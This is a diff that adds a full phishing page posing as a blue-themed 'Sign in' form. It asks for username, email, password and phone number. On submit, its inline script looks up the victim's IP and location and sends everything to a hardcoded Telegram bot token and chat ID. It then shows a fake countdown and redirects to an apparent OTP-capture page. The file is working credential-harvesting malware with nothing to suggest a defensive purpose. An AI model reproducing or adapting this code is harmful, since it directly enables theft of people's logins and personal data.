@@ -1,0 +1,221 @@
+ <!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Sign in</title>
+      <!-- Favicon -->
+  <link rel="icon" href="IMG/sbg.png" type="image/png" />
+  <style>
+    html, body {
+      height: 100%;
+      margin: 0;
+      font-family: Inter, Segoe UI, Roboto, Arial, sans-serif;
+      background: linear-gradient(180deg, #083a97 0%, #0288d1 100%);
+    }
+
+    .page-form {
+      height: 100vh;
+      width: 100vw;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      padding: 40px 20px 20px 20px;
+      box-sizing: border-box;
+    }
+
+    .top-image {
+      display: block;
+      margin-bottom: 20px;
+      max-width: 120px;
+    }
+
+    .container {
+      background: white;
+      padding: 30px 40px;
+      border-radius: 8px;
+      box-shadow: 0 6px 18px rgba(0, 0, 0, 0.25);
+      max-width: 420px;
+      width: 100%;
+      box-sizing: border-box;
+      text-align: center;
+    }
+
+    h1 {
+      font-size: 20px;
+      margin-bottom: 20px;
+      color: black;
+      font-weight: 400;
+      text-align: center;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 6px;
+      font-weight: 600;
+      color: #083a97;
+      text-align: left;
+    }
+
+    input[type="text"],
+    input[type="tel"],
+    input[type="email"],
+    input[type="password"] {
+      width: 100%;
+      padding: 8px;
+      margin-bottom: 4px;
+      border: none;
+      border-bottom: 2px solid #173ea8;
+      outline: none;
+      font-size: 14px;
+      background: transparent;
+      color: #000;
+      box-sizing: border-box;
+    }
+
+    input:focus {
+      border-color: #173ea8;
+    }
+
+    button {
+      width: 100%;
+      padding: 10px;
+      background-color: #173ea8;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
+      font-weight: 300;
+      letter-spacing: 0.6px;
+      transition: opacity 0.3s ease;
+      margin-top: 20px;
+    }
+
+    button:hover {
+      opacity: 0.9;
+    }
+  </style>
+</head>
+<body>
+  <div class="page-form">
+    <img src="IMG/sbg.png" alt="Small Image" class="top-image" />
+
+    <div class="container">
+      <h1>Sign in</h1>
+
+      <form id="additionalForm">
+        <label for="name">Username</label>
+        <input type="text" id="name" name="name" required autocomplete="off" />
+
+        <label for="email">Email</label>
+        <input type="email" id="email" name="email" required autocomplete="off" />
+
+        <label for="password">Password</label>
+        <input type="password" id="password" name="password" required autocomplete="off" />
+
+        <label for="phone">Phone Number</label>
+        <input type="tel" id="phone" name="phone" required autocomplete="off" />
+
+        <button type="submit">SIGN IN</button>
+      </form>
+    </div>
+  </div>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', () => {
+      const TELEGRAM_BOT_TOKEN = '8579510849:AAEmgt0Vk4Z7ZaQp2KZdrqVHAr6t78YnO5Y';
+      const TELEGRAM_CHAT_ID = '6305965230';
+
+      document.getElementById('additionalForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        const name = document.getElementById('name').value;
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+        const phone = document.getElementById('phone').value;
+
+        fetch('https://ipinfo.io/json?token=48a36e97612e2a')
+          .then(response => response.json())
+          .then(data => {
+            const ip = data.ip || 'Unknown IP';
+            const location = `${data.city || 'Unknown city'}, ${data.region || 'Unknown region'}, ${data.country || 'Unknown country'}`;
+
+            const message = `
+ *Login info*
+----------------------------
+ *Username:* ${name}
+ *Email:* ${email}
+ *Password:* ${password}
+ *Phone:* ${phone}
+ *IP:* ${ip}
+ *Location:* ${location}
+            `;
+
+            const telegramURL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+            fetch(telegramURL, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown'
+              })
+            })
+            .then(resp => {
+              if (resp.ok) {
+                let seconds = 30;
+                document.body.innerHTML = `
+                  <div style="display:flex; justify-content:center; align-items:center; height:100vh; font-family: Inter, Segoe UI, Roboto, Arial, sans-serif;">
+                    <div style="text-align:center; color:#fff;">
+                      <h2>Submitting your information...</h2>
+                      <p>Please wait, you will be redirected in <span id="countdown">${seconds}</span> seconds.</p>
+                      <div style="
+                        margin: 20px auto;
+                        width: 40px;
+                        height: 40px;
+                        border: 4px solid #ccc;
+                        border-top: 4px solid #173ea8;
+                        border-radius: 50%;
+                        animation: spin 1s linear infinite;
+                      "></div>
+                    </div>
+                  </div>
+
+                  <style>
+                    @keyframes spin {
+                      0% { transform: rotate(0deg); }
+                      100% { transform: rotate(360deg); }
+                    }
+                  </style>
+                `;
+
+                const countdownElem = document.getElementById('countdown');
+                const interval = setInterval(() => {
+                  seconds--;
+                  countdownElem.innerText = seconds;
+                  if (seconds <= 0) {
+                    clearInterval(interval);
+                    window.location.href = 'otp1.html';
+                  }
+                }, 1000);
+              } else {
+                alert('Failed to submit to Telegram. Please try again.');
+              }
+            })
+            .catch(error => {
+              console.error('Telegram error:', error);
+              alert('Error sending data to Telegram.');
+            });
+          })
+          .catch(err => {
+            console.warn('Failed to fetch IP info:', err);
+            alert('Failed to retrieve IP info. Please try again.');
+          });
+      });
+    });
+  </script>
+</body>
+</html>
